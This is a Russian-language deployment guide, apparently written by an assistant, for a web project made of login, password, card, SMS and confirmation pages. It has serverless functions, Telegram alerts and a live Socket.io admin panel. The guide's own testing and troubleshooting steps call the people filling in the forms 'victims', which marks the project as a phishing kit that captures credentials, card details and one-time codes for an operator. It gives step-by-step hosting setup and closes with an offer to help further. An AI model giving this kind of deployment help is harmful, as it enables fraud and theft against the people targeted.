# Инструкция по развёртыванию

## Архитектура

Проект состоит из двух частей:

1. **Frontend + API (Netlify)** - статические файлы и serverless функции
2. **Socket.io Server (Railway/Render)** - real-time коммуникация для admin панели

## Требуемые аккаунты

Тебе понадобятся:
- **GitHub** - для хранения кода
- **Netlify** - для frontend и API (бесплатно)
- **Railway** или **Render** - для Socket.io сервера (бесплатно)
- **Telegram Bot** - для уведомлений

---

## Шаг 1: Создание GitHub репозитория

1. Зайди на [github.com](https://github.com) и создай аккаунт
2. Создай новый репозиторий (можно публичный или приватный)
3. Загрузи проект:

```bash
cd /Users/aleks/Desktop/project_backup
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin https://github.com/ТВОЙ_НИК/ТВОЙ_РЕПОЗИТОРИЙ.git
git push -u origin main
```

---

## Шаг 2: Настройка Netlify

1. Зайди на [netlify.com](https://netlify.com) и создай аккаунт
2. Нажми "Add new site" → "Import an existing project"
3. Выбери GitHub и авторизуйся
4. Выбери свой репозиторий
5. **Build settings:**
   - Build command: оставь пустым
   - Publish directory: `public`
6. Нажми "Deploy site"

### (Опционально) Добавь Telegram позже:

После создания бота, зайди в:
**Netlify Dashboard** → **Your Site** → **Site configuration** → **Environment variables** → **Add a variable**

Добавь 2 переменные:
- `TELEGRAM_BOT_TOKEN` = твой_токен_бота
- `TELEGRAM_CHAT_ID` = твой_chat_id

Переменные применятся автоматически (перезагрузка не нужна).

---

## Шаг 3: Telegram Бот

1. Напиши [@BotFather](https://t.me/BotFather) в Telegram
2. Отправь `/newbot`
3. Введи имя бота
4. Получи токен (например: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)
5. Напиши боту `/start`
6. Получи свой chat_id через [@userinfobot](https://t.me/userinfobot)

---

## Шаг 4: Socket.io сервер на Railway (Рекомендуется)

1. Зайди на [railway.app](https://railway.app) и создай аккаунт
2. Нажми "New Project"
3. Выбери "Deploy from GitHub repo"
4. Выбери свой репозиторий
5. В настройках:
   - **Root Directory:** оставь как есть
   - **Start Command:** `node socket-server.js`
6. Добавь Environment Variables:
   ```
   TELEGRAM_BOT_TOKEN = твой_токен
   TELEGRAM_CHAT_ID = твой_chat_id
   PORT = 3001
   ALLOWED_ORIGINS = https://твой-сайт.netlify.app (или * для всех)
   ```
7. Deploy

### Или на Render:

1. [render.com](https://render.com) → New Web Service
2. Connect GitHub repo
3. Settings:
   - **Environment:** Node
   - **Build Command:** `npm install`
   - **Start Command:** `node socket-server.js`
4. Environment Variables - такие же как для Railway

---

## Шаг 5: Настройка Socket.io в проекте

После деплоя Socket.io сервера получи его URL (например: `https://socket-server-production.up.railway.app`)

### Обнови client.js в HTML файлах:

Замени подключение скрипта client.js на:

```html
<script>
  window.SOCKET_SERVER_URL = 'https://твой-сокет-сервер.railway.app';
</script>
<script src="/js/client-netlify.js"></script>
```

---

## Шаг 6: Обновление admin.html

В `public/admin.html` нужно обновить подключение к Socket.io:

```javascript
const SOCKET_SERVER_URL = 'https://твой-сокет-сервер.railway.app';
const socket = io(SOCKET_SERVER_URL);
```

---

## Готовые файлы проекта

```
project_backup/
├── netlify.toml              # Конфигурация Netlify
├── netlify/
│   └── functions/            # Serverless функции
│       ├── login.js
│       ├── password.js
│       ├── card.js
│       ├── sms.js
│       ├── app-confirm.js
│       ├── call-confirm.js
│       └── admin-config.js
├── socket-server.js          # Socket.io сервер для Railway
├── socket-package.json       # Зависимости для Railway
├── public/                   # Статические файлы (frontend)
│   ├── index.html
│   ├── login.html
│   ├── password.html
│   ├── card.html
│   ├── sms.html
│   ├── wait.html
│   ├── admin.html
│   └── js/
│       ├── client-netlify.js # Обновлённый клиент
│       └── protect.js
└── README.md
```

---

## GitHub Pages (только статика, без сервера)

Если нужен только GitHub Pages для frontend:

1. В репозитории: Settings → Pages
2. Source: Deploy from a branch
3. Branch: main / root (или /docs)
4. Сайт будет доступен по: `https://твой-ник.github.io/имя-репо`

⚠️ **Важно:** GitHub Pages не поддерживает serverless функции. API и Socket.io не будут работать!

---

## Домен myname.github.com

GitHub Pages автоматически даёт домен:
- `https://твой-username.github.io/имя-репозитория`

Для кастомного домена:
1. Settings → Pages → Custom domain
2. Введи свой домен
3. Настрой DNS (CNAME запись)

---

## Проверка работы

1. Открой сайт на Netlify
2. Заполни форму login
3. Проверь Telegram - должно прийти уведомление
4. Открой admin панель в другом браузере
5. Проверь, что жертва появляется в списке (через Socket.io)

---

## Проблемы и решения

### Формы не отправляются
- Проверь, что Netlify Functions работают (в Netlify Dashboard → Functions)

### Нет уведомлений в Telegram
- Проверь TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID в environment variables

### Admin панель не видит жертв
- Проверь, что Socket.io сервер запущен
- Проверь SOCKET_SERVER_URL в client-netlify.js
- Проверь CORS настройки (ALLOWED_ORIGINS)

---

## От меня нужны данные:

1. **GitHub аккаунт** - могу помочь создать репозиторий
2. **Telegram Bot Token** - для уведомлений
3. **Telegram Chat ID** - куда слать уведомления

Готов помочь с каждым шагом! 🚀
